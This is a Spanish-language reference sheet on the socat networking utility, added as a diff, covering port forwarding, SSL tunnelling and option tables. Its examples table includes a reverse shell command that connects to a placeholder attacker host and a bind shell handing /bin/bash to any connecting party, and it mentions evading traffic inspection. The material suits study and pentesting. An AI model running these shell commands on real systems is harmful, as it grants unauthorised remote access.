@@ -1,0 +1,91 @@
+Socat (SOcket CAT) es una utilidad de línea de comandos que funciona como un “conector de flujos de datos” entre dos puntos.
+
+En otras palabras, permite enviar y recibir datos entre dos “ends”, que pueden ser:
+
+    > Archivos
+    > Puertos TCP/UDP
+    > Sockets UNIX
+    > Pseudoterminales (PTY)
+    > Canales estándar de entrada/salida
+
+Es como netcat, pero más potente y flexible, ya que soporta múltiples protocolos y opciones de configuración.
+
+
+¿Para qué se usa?
+
+    En informática y ciberseguridad, Socat se utiliza para:
+    
+    1. Redirección de puertos
+    
+        > Redirigir tráfico de un puerto local a un puerto remoto.
+        > Ejemplo: exponer un servicio interno de una máquina detrás de un firewall.
+    
+    2. Tunelización de conexiones
+    
+        > Crear túneles TCP/UDP o incluso cifrados con SSL.
+        > Muy usado para bypass de firewalls.
+    
+    3. Forwarding de shells
+    
+        > En pruebas de penetración, se puede usar para reverse shells o bind shells más avanzadas que con netcat.
+    
+    4. Proxy entre servicios
+    
+        > Actuar como intermediario entre clientes y servidores.
+    
+    5. Debug de redes
+    
+        > Escuchar y enviar datos entre sockets para probar aplicaciones de red.
+
+
+Sintaxis básica
+
+    socat [OPCIONES] <FUENTE> <DESTINO>
+
+
+Opciones principales de Socat
+
+     Ejemplos de “FUENTE” y “DESTINO”
+    -----------------------------------------------------------
+    |  Opción             |  Descripción                      |
+    -----------------------------------------------------------
+    |  TCP-LISTEN:8080    | escuchar puerto TCP 8080          |
+    |  TCP:host:80        | conectarse a host en puerto 80    |
+    |  UDP-LISTEN:1234    | escuchar puerto UDP 1234          |
+    |  FILE:/tmp/archivo  | leer/escribir archivo             |
+    |  STDIO              | usar entrada/salida estándar      |
+    -----------------------------------------------------------
+
+
+Ejemplos prácticos
+
+    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    |  Opción                            |  Ejemplo de Uso                                                            |  Descripción                                                                   |      
+    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    |  Redirigir puerto local a remoto   |  socat TCP-LISTEN:8080,fork TCP:example.com:80                             |  Escucha localmente en el puerto 8080 y redirige al puerto 80 de example.com.  |
+    |  Reverse shell (Linux)             |  socat TCP:attacker_ip:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane   |  La máquina víctima se conecta al atacante y da acceso a un shell.             |
+    |  Bind shell                        |  socat TCP-LISTEN:5555,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane   |  Escucha en el puerto 5555 y entrega un shell a quien se conecte.              |
+    |  Tunnel SSL                        |  socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,fork TCP:127.0.0.1:80  |  Crea un túnel cifrado desde el puerto 443 hacia el puerto 80 interno.         |
+    |  Enviar archivo por TCP            |  socat FILE:archivo.txt TCP:192.168.0.10:1234                                                                                                               |
+    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Opciones útiles
+
+    -----------------------------------------------------------------------
+    |  Opción       |  Descripción                                        |
+    -----------------------------------------------------------------------
+    |  fork         |  permite manejar múltiples conexiones simultáneas   |
+    |  reuseaddr    |  permite reutilizar la misma dirección de socket    |
+    |  pty          |  asigna un pseudoterminal (útil en shells)          |
+    |  stderr       |  redirige errores                                   |
+    |  setsid       |  ejecuta en nueva sesión                            |
+    |  sigint       |  captura Ctrl+C                                     |
+    |  sane         |  establece terminal en modo estándar                |
+    -----------------------------------------------------------------------
+	
+
+Tip de ciberseguridad:
+
+    Socat es muy usado en pentesting para pivoting, tunneling, y reverse shells cuando Netcat no es suficiente. También se puede combinar con SSL/TLS para evadir inspección de tráfico 
+    en pruebas internas de seguridad.
